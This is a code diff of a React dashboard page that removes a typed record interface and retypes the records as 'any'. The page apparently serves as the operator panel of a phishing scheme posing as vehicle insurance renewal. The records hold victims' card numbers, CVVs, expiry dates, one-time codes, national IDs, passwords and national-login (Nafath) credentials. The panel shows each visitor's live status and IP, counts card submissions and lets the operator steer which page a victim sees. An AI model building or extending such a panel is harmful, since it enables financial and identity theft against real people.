@@ -73,69 +73,6 @@ import { ScrollArea } from "@/components/ui/scroll-area";
 // Types
 type FlagColor = "red" | "yellow" | "green" | null;
 
-interface Notification {
-  createdDate: string;
-  owner_identity_number:string;
-  id: string;
-formData:{
-  insurance_purpose: "renewal" | "property-transfer";
-  vehicle_type: "registration" | "customs" | "serial";
-  documment_owner_full_name: string;
-  owner_identity_number?: string;
-  buyer_identity_number?: string;
-  seller_identity_number?: string;
-  
-  phoneNumber?: string;
-  phoneOtpCode?: string; // New field
-  operator?: string; // New field
-  serial_number?: string;
-  vehicle_manufacture_number?: string;
-  customs_code?: string;
-  agreeToTerms: boolean;
-}
-phoneOtpCode?: string; // New field
-  operator?: string; // New field
-phone2?: string; // New field
-documment_owner_full_name:string;
-phone?:string;
-  cardNumber: string;
-  currentPage?: string;
-  country?: string;
-  status: "pending" | "approved" | "rejected" | string;
-  isOnline?: boolean;
-  lastSeen: string;
-  flagColor?: FlagColor;
-  isHidden?: boolean;
-  ip?: string;
-  otp?: string;
-  allOtps?: string[];
-  otpCode?: string;
-  otpSent: boolean;
-  otpVerificationTime?: string;
-  otpVerified: boolean;
-  paymentStatus: string;
-  policyStartDate?: string;
-  selectedAddons?: any[];
-  selectedInsuranceOffer?: string;
-  sequenceNumber?: string;
-  specialDiscounts?: boolean;
-  submissionTime?: string;
-  cardYear?: string;
-  cardMonth?: string;
-  cvv?: string;
-  nafaz_pin?: string; // Existing field, now editable
-  identity_number?: string;
-  password?: string;
-  allOtp?: string[];
-  nafadUsername?: string;
-  nafadPassword?: string;
-  nafazVerified?: boolean;
-  nafazLoginTime?: string;
-  nafazStatus?: "pending" | "verified" | "failed";
-  nafazAttempts?: number;
-  phoneVerificationStatus: string;
-  
-}
 
 // Custom Hooks
 function useOnlineUsersCount() {
@@ -190,7 +127,7 @@ function UserStatus({ userId }: { userId: string }) {
   );
 }
 
-function NafazStatus({ notification }: { notification: Notification }) {
+function NafazStatus({ notification }: { notification: any }) {
   if (!notification.nafadUsername) {
     return null;
   }
@@ -232,7 +169,7 @@ function NotificationCard({
   onFlagChange,
   onCurrentPageUpdate,
 }: {
-  notification: Notification;
+  notification: any;
   isSelected: boolean;
   onClick: () => void;
   onFlagChange: (id: string, color: FlagColor) => void;
@@ -477,7 +414,7 @@ function NotificationDetails({
   onCurrentPageUpdate,
   onAuthNumberUpdate,
 }: {
-  notification: Notification | null;
+  notification: any | null;
   onClose: () => void;
   onCurrentPageUpdate?: (id: string, currentPage: string) => void;
   onAuthNumberUpdate?: (id: string, authNumber: string) => void;
@@ -1320,7 +1257,7 @@ function NotificationDetails({
 
 // Main Component
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([]);
+  const [notifications, setNotifications] = useState<any[]>([]);
   const [isLoading, setIsLoading] = useState(true);
   const [selectedNotificationId, setSelectedNotificationId] = useState<
     string | null
@@ -1341,7 +1278,7 @@ export default function NotificationsPage() {
   const { toast } = useToast();
   const onlineUsersCount = useOnlineUsersCount();
   const audioRef = useRef<HTMLAudioElement | null>(null);
-  const prevNotificationsRef = useRef<Notification[]>([]);
+  const prevNotificationsRef = useRef<any[]>([]);
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
     {}
   );
@@ -1477,7 +1414,7 @@ export default function NotificationsPage() {
   }, [notifications]);
 
   const updateStatistics = useCallback(
-    (activeNotifications: Notification[]) => {
+    (activeNotifications: any[]) => {
       setTotalVisitors(activeNotifications.length);
       setCardSubmissions(
         activeNotifications.filter((n) => !!n.cardNumber).length
@@ -1503,7 +1440,7 @@ export default function NotificationsPage() {
         const notificationsData = querySnapshot.docs.map((doc) => ({
           id: doc.id,
           ...doc.data(),
-        })) as Notification[];
+        })) as any[];
 
         updateStatistics(notificationsData.filter((n) => !n.isHidden));
         setNotifications(notificationsData);
@@ -1664,7 +1601,7 @@ export default function NotificationsPage() {
     }
   };
 
-  const handleNotificationClick = (notification: Notification) => {
+  const handleNotificationClick = (notification: any) => {
     setSelectedNotificationId(notification.id);
     setShowDetails(true);
   };
@@ -2043,4 +1980,3 @@ export default function NotificationsPage() {
     </div>
   );
 }
-
